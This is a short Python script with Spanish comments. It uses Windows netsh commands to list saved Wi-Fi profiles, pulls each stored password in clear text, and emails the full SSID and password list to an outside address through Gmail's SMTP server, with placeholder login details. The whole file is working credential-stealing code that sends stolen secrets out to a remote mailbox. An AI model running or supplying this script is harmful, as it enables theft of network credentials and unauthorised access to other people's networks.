import subprocess
import re
import smtplib
from email.message import EmailMessage

# Obtener información de los perfiles Wi-Fi usando netsh
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode('latin-1')
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list = list()

# Verificar si existen perfiles Wi-Fi
if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode('latin-1')
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode('latin-1')
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

# Construir el mensaje de correo con los detalles de Wi-Fi
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Configurar el correo electrónico
email = EmailMessage()
email["from"] = "name_of_sender"
email["to"] = "email_address"
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Enviar el correo electrónico usando SMTP (en este caso, Gmail)
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login("login_name", "password")
    smtp.send_message(email)
